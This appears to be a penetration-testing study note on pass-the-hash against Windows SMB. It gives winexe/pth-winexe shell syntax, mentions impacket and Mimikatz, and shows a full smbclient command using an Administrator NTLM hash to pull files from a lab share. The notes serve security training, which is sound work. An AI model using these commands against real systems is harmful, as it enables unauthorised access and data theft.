Remote Shells w/ winexe & pth-winexe on Windows
If youâ€™re able to come across credentials or NTLM hashes for a Windows box that has SMB enabled, you may be able to leverage the tool called winexe to gain a shell. If you have captured a NTLM hash, say from dumping a SAM database, you may be able to pass-the-hash.

Basic syntax w/ credentials:
winexe -U <domain/username>%<password> //<targetIP> cmd.exe

Basic syntax w/ NTLM hash (pass the hash technique):
pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe

smbclient pTh
For SMB enumeration and management, we can use smbclient or CrackMapExec. 
For command execution, we can use the scripts from the impacket library like psexec.py and wmiexec.py. 
We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and WinRM, if the user has the required rights. 
We can also use Mimikatz to conduct pass-the-hash as well.

To use the command, we need to enter the path of the share as the first argument by escaping the backslashes. 
In this case, we will enter \\\\192.168.59.212\\secrets. 
We'll use the -U Administrator to set the user and --pw-nt-hash to indicate the hash.

After we successfully connect to the SMB share "secrets" with smbclient, we can list all files in the SMB share with dir. 
We can also use the get command to download files to our Kali machine.

smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
